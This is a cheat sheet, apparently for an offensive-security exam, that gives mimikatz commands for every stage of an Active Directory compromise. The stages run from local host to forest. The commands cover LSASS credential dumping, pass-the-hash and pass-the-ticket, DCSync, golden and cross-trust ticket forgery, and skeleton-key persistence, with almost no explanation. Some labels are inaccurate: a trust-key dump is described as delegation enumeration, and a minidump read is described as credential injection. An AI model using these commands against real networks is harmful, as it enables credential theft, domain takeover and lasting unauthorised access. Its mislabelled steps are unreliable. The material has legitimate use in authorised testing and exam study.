## 1. Local Machine / Host Context

### 1.1 Credential Material in Memory
Extract plaintext credentials, NTLM hashes, and Kerberos tickets from LSASS memory
```
mimikatz # sekurlsa::logonpasswords
```

### 1.2 Logon Sessions
List all logon sessions
```
mimikatz # sekurlsa::logonPasswords
```

### 1.3 Token & Privilege Abuse (Local)

Check current token privileges
```
mimikatz # token::whoami
```
Enable debug privileges if available
```
mimikatz # privilege::debug
```

---

## 2. Local Administrator → Domain-Relevant Impact

### 2.1 Cached Domain Credentials

Extract domain cached credentials from memory
```
mimikatz # sekurlsa::msv
mimikatz # sekurlsa::kerberos
```

### 22 Kerberos Artifacts (Local Cache)

Extract Kerberos tickets cached in LSASS
```
mimikatz # sekurlsa::tickets
```

### 2.3 Credential Reuse Potential

Pass-the-Hash example using extracted NTLM hash
```
mimikatz # sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH>
```
Import a Kerberos ticket (Pass-the-Ticket)
```
mimikatz # kerberos::ptt <TICKET_FILE>.kirbi
```


---

## 3. Active Directory User Context

### 3.1 Kerberos Abuse (User-Level)

Export current user's Kerberos tickets for reuse
```
mimikatz # kerberos::list /export
```

### 3.2 Delegation Exposure (If Applicable)

Enumerate delegation settings on the current account
```
mimikatz # lsadump::trust /patch
```

### 3.3 Lateral Movement Enablement

Use existing TGT to request service tickets for other SPNs
```
mimikatz # kerberos::ask /target:<SPN_NAME>/<DOMAIN_CONTROLLER>
```

---

## 4. Domain Administrator Context

### 4.1 NTDS.dit–Related Attacks

Perform DCSync attack to replicate domain password data
```
mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\<USER_ACCOUNT>
```

### 4.2 KRBTGT Abuse

Create a Golden Ticket using krbtgt credentials (use carefully!)
```
mimikatz # kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM_HASH> /ticket:<OUTPUT_TICKET>.kirbi
```

### 4.3 Trust Exploitation

Forge an inter-realm trust ticket for cross-trust access
```
mimikatz # kerberos::golden /user:<USER> /domain:<CHILD_DOMAIN> /sid:<CHILD_SID> /krbtgt:<TRUST_KEY_NTLM> /target:<PARENT_DOMAIN_FQDN> /ticket:<TRUST_TICKET>.kirbi
```

---

## 5. Domain Controller Context

### 5.1 LSASS on DC

Extract all domain-wide secrets from DC's LSASS memory
```
mimikatz # sekurlsa::logonpasswords
```

### 5.2 Replication Attacks

Sync entire domain credentials via DCSync
```
mimikatz # lsadump::dcsync /all
```

### 5.3 Persistence Mechanisms

Apply skeleton key to LSASS (WARNING: HIGHLY DETECTABLE IN PROD!)
```
mimikatz # misc::skeleton
```

---

## 6. Cross-Domain / Forest-Level Attacks

### 6.1 Trust Keys & Tickets

Retrieve trust keys to forge inter-realm tickets
```
mimikatz # lsadump::trust /patch
```

### 6.2 Forest Persistence

Forge a forest-level Golden Ticket for enterprise admin access
```
mimikatz # kerberos::golden /user:<USER> /domain:<FOREST_ROOT_DOMAIN> /sid:<ROOT_SID> /krbtgt:<ROOT_KRBTGT_HASH> /groups:512 /ticket:<ENTERPRISE_TICKET>.kirbi
```

---

## 7. Persistence-Focused Usage

### Golden Tickets (Long-Lived Access)

Reintroduce Golden Ticket from disk for access renewal
```
mimikatz # kerberos::ptt <GOLDEN_TICKET>.kirbi
```

### Cached Credential Planting (Advanced)

Inject custom credentials into LSASS (requires deeper setup)
```
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords
```

---

## One-Line Exam Orientation Map

| Context      | Primary Action                        |
| ------------ | ------------------------------------- |
| Local box    | `sekurlsa::logonpasswords`            |
| Domain user  | `kerberos::list /export`              |
| Local admin  | `sekurlsa::pth`                       |
| Domain admin | `lsadump::dcsync`                     |
| DC           | `sekurlsa::logonpasswords (on DC)`    |
| Forest       | `kerberos::golden (Enterprise Admin)` |
